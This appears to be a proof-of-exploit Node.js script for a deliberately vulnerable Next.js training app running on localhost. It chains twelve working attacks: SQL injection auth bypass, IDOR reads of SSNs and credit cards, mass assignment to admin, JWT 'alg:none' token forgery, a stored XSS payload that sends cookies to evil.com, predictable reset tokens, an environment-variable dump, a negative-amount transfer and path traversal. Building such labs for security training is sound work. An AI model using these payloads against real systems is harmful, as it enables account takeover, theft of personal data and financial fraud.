#!/usr/bin/env node
/**
 * ⚠️ PROOF OF EXPLOIT — VulnApp Next.js
 * Demonstrates all major vulnerabilities in this deliberately-vulnerable app.
 * Run: node poe.mjs (while the app is running on http://localhost:3000)
 */

const BASE = "http://localhost:3000";

async function req(method, path, body, headers = {}) {
  const opts = {
    method,
    headers: { "Content-Type": "application/json", ...headers },
  };
  if (body) opts.body = JSON.stringify(body);
  const r = await fetch(`${BASE}${path}`, opts);
  return r.json().catch(() => ({}));
}

async function run() {
  console.log("═".repeat(60));
  console.log("  VulnApp — Proof of Exploit Script");
  console.log("═".repeat(60));

  // ── 1. SQL Injection — auth bypass ──────────────────────────
  console.log("\n[1] SQL Injection (VULN-006) — Auth Bypass");
  const sqli = await req("POST", "/api/auth/login", {
    username: "' OR '1'='1",
    password: "anything",
  });
  console.log("  Result:", JSON.stringify({ token: sqli.token?.slice(0, 30) + "...", user: sqli.user?.username }));
  const adminToken = sqli.token;

  // ── 2. IDOR — read any user's PII ───────────────────────────
  console.log("\n[2] IDOR (VULN-034) — Read Alice's SSN without auth");
  const idor = await req("GET", "/api/users/2");
  console.log("  Alice SSN:", idor.ssn, "| Credit Card:", idor.creditCard);

  // ── 3. Unauthenticated user list ────────────────────────────
  console.log("\n[3] No Auth on User List (VULN-036) — All users + PII");
  const users = await req("GET", "/api/users");
  console.log("  Users:", users.users?.map(u => `${u.username}[${u.ssn}]`).join(", "));

  // ── 4. Mass Assignment — escalate to admin ──────────────────
  console.log("\n[4] Mass Assignment (VULN-019/022) — Register as admin");
  const ma = await req("POST", "/api/auth/register", {
    username: "hacker_" + Date.now(),
    password: "x",
    role: "admin",
    isAdmin: true,
    balance: 999999,
  });
  console.log("  New user role:", ma.user?.role, "| isAdmin:", ma.user?.isAdmin, "| balance:", ma.user?.balance);

  // ── 5. JWT alg:none — forge admin token ─────────────────────
  console.log("\n[5] JWT alg:none (VULN-008) — Forge admin token");
  const fakeHeader  = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
  const fakePayload = Buffer.from(JSON.stringify({ id: 1, username: "admin", role: "admin", iat: Date.now() })).toString("base64url");
  const forgedToken = `${fakeHeader}.${fakePayload}.`;
  const adminCheck  = await req("GET", "/api/admin?action=backdoor", {}, { Authorization: `Bearer ${forgedToken}` });
  console.log("  Admin API Key via forged token:", adminCheck.adminApiKey);

  // ── 6. Stored XSS payload ────────────────────────────────────
  console.log("\n[6] Stored XSS (VULN-046/048) — Plant XSS payload");
  const xss = await req("POST", "/api/comments", {
    postId: 1,
    author: "attacker",
    content: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
  });
  console.log("  Comment stored with id:", xss.comment?.id, "— content will execute in browser");

  // ── 7. Password Reset Enumeration + Predictable Token ───────
  console.log("\n[7] Predictable Reset Token (VULN-011) + Enumeration (VULN-057)");
  const reset1 = await req("POST", "/api/auth/reset", { username: "alice" });
  const reset2 = await req("POST", "/api/auth/reset", { username: "bob" });
  console.log("  Alice token:", reset1.resetToken, "| Bob token:", reset2.resetToken, "← sequential!");

  // ── 8. Open Redirect ────────────────────────────────────────
  console.log("\n[8] Open Redirect (VULN-063)");
  console.log("  URL: " + BASE + "/api/redirect?returnUrl=https://evil.com");
  console.log("  → Will redirect user to evil.com");

  // ── 9. Admin env dump ───────────────────────────────────────
  console.log("\n[9] Env Var Dump (VULN-052) via forged token");
  const envDump = await req("GET", "/api/admin?action=debug", {}, { Authorization: `Bearer ${forgedToken}` });
  const envKeys = Object.keys(envDump.env || {}).slice(0, 8);
  console.log("  Env vars leaked:", envKeys.join(", "), "...");

  // ── 10. Negative Transfer — steal balance ───────────────────
  console.log("\n[10] Business Logic (VULN-071) — Negative transfer (requires auth)");
  if (adminToken) {
    const transfer = await req("POST", "/api/transfer",
      { toUserId: 1, amount: -50000 },
      { Authorization: `Bearer ${adminToken}` }
    );
    console.log("  Result:", transfer.message, "| New balance:", transfer.yourNewBalance);
  }

  // ── 11. Private posts exposed ───────────────────────────────
  console.log("\n[11] Private Post Exposure (VULN-044)");
  const posts = await req("GET", "/api/posts?id=1");
  console.log("  Private post content:", posts.post?.content);

  // ── 12. File path traversal (simulated) ─────────────────────
  console.log("\n[12] Path Traversal (VULN-026)");
  console.log("  GET /api/files?file=../../lib/db.ts → reads source with hardcoded secrets");

  console.log("\n" + "═".repeat(60));
  console.log("  All exploits complete. See VULNERABILITIES.md for full list.");
  console.log("═".repeat(60));
}

run().catch(console.error);
